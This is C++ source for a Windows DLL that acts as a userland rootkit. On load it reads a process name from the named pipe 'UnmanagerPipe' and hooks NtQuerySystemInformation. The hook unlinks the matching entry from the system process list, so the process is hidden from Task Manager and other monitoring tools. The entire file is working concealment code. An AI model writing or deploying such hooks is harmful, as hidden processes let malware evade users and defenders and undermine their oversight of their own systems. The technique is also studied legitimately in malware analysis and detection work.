#include "FunctionHooker.h"
#include <Windows.h>
#include <winternl.h>

#if _WIN64
#define HookStruct HookStruct64
#elif _WIN32
// Currently unsupported
#endif

#ifndef HookStruct
#error Only currently supporting 64 bit
#endif

HookStruct hookData;

UNICODE_STRING hiddenName;

typedef NTSTATUS (*_OriginalNtQuerySystemInformation)(SYSTEM_INFORMATION_CLASS, PVOID, ULONG, PULONG);
typedef void(*_RtlInitAnsiString)(PANSI_STRING, PCSZ);
typedef NTSTATUS(*_RtlAnsiStringToUnicodeString)(PUNICODE_STRING, PCANSI_STRING, BOOL);

NTSTATUS __stdcall MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength)
{
	_OriginalNtQuerySystemInformation OriginalNtQuerySystemInformation = (_OriginalNtQuerySystemInformation) hookData.OriginalFunction;

	NTSTATUS result = OriginalNtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	if (SystemInformationLength <= 0)
	{
		return result;
	}

	if (NT_SUCCESS(result))
	{
		if (SystemInformationClass == SystemProcessInformation)
		{
			SYSTEM_PROCESS_INFORMATION* processInfo;
			SYSTEM_PROCESS_INFORMATION* previousProcessInfo;

			char* systemInformationBuffer = (char*)SystemInformation;
			int offset = 0;

			do
			{
				processInfo = ((SYSTEM_PROCESS_INFORMATION*)(systemInformationBuffer + offset));

				if (lstrcmpiW(processInfo->ImageName.Buffer, hiddenName.Buffer) == 0)
				{
					if (processInfo->NextEntryOffset == 0)
					{
						previousProcessInfo->NextEntryOffset = 0;
					}
					else
					{
						unsigned long nextOffset = previousProcessInfo->NextEntryOffset;

						nextOffset += processInfo->NextEntryOffset;

						previousProcessInfo->NextEntryOffset = nextOffset;
					}
				}

				previousProcessInfo = processInfo;

				offset += processInfo->NextEntryOffset;
			} while (processInfo->NextEntryOffset != 0);
		}
	}



	return result;
}


BOOL APIENTRY DllMain( HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	HANDLE pipe = INVALID_HANDLE_VALUE;
	FunctionHooker hooker;
	HMODULE ntdllBase; 
	BOOL isWowProcess;
	BOOL wowCheckFailed = 0;
	void* ntQueryAddr;
	void* rtlInitAddr;
	void* rtlAnsiToUnicodeAddr;


    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:

		ntdllBase = LoadLibraryA("ntdll.dll");
		
		ntQueryAddr = GetProcAddress(ntdllBase, "NtQuerySystemInformation");
		rtlInitAddr = GetProcAddress(ntdllBase, "RtlInitAnsiString");
		rtlAnsiToUnicodeAddr = GetProcAddress(ntdllBase, "RtlAnsiStringToUnicodeString");

		pipe = CreateFileW(L"\\\\.\\pipe\\UnmanagerPipe", GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);

		if (pipe != INVALID_HANDLE_VALUE)
		{
			DWORD bytesRead;

			char readBuffer[MAX_PATH];

			while (!ReadFile(pipe, readBuffer, MAX_PATH, &bytesRead, NULL))
			{
				Sleep(5);
			}

			_RtlInitAnsiString MyRtlInitAnsiString;
			_RtlAnsiStringToUnicodeString MyRtlAnsiStringToUnicodeString;

			if (rtlInitAddr)
			{
				MyRtlInitAnsiString = (_RtlInitAnsiString) rtlInitAddr;

				if (rtlAnsiToUnicodeAddr)
				{
					MyRtlAnsiStringToUnicodeString = (_RtlAnsiStringToUnicodeString) rtlAnsiToUnicodeAddr;

					ANSI_STRING originalString;

					MyRtlInitAnsiString(&originalString, readBuffer);

					NTSTATUS status = MyRtlAnsiStringToUnicodeString(&hiddenName, &originalString, true);

					if (NT_SUCCESS(status))
					{
						if (ntQueryAddr)
						{
							#if _WIN64
								hooker.HookFunction64(ntQueryAddr, &MyNtQuerySystemInformation, &hookData);
							#elif _WIN32							
								// Currently unsupported. 
							#endif
						}
					}
				}
			}

			CloseHandle(pipe);
		}

		break;
    case DLL_THREAD_ATTACH:
		break;
    case DLL_THREAD_DETACH:
		break;
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}